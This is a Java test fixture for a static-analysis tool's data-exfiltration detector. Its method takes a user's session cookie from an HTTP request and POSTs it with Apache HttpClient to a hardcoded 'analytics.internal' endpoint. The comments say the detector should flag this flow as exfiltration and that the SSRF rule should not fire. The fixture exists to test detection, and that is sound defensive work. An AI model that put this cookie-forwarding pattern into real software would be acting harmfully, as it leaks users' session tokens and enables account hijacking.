// DATA_EXFIL fixture: Apache HttpClient.  A request cookie (Sensitive)
// is wrapped in a StringEntity (default smear) and attached to an
// HttpPost via setEntity (also default smear).  The network call
// happens at `httpClient.execute(req)`, which type-qualified resolution
// rewrites to `HttpClient.execute` via JAVA_HIERARCHY
// (CloseableHttpClient subtypes HttpClient).  SSRF must NOT fire (URL
// is a hardcoded constant on the HttpPost ctor).
//
// Driven by `data_exfil_java_integration_tests.rs`.
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class DataExfilApacheHttpClient {
    public void leak(HttpServletRequest request) throws Exception {
        Cookie[] cookies = request.getCookies();
        String session = cookies[0].getValue();
        CloseableHttpClient httpClient = HttpClients.createDefault();
        HttpPost req = new HttpPost("https://analytics.internal/track");
        req.setEntity(new StringEntity(session));
        HttpResponse resp = httpClient.execute(req);
    }
}
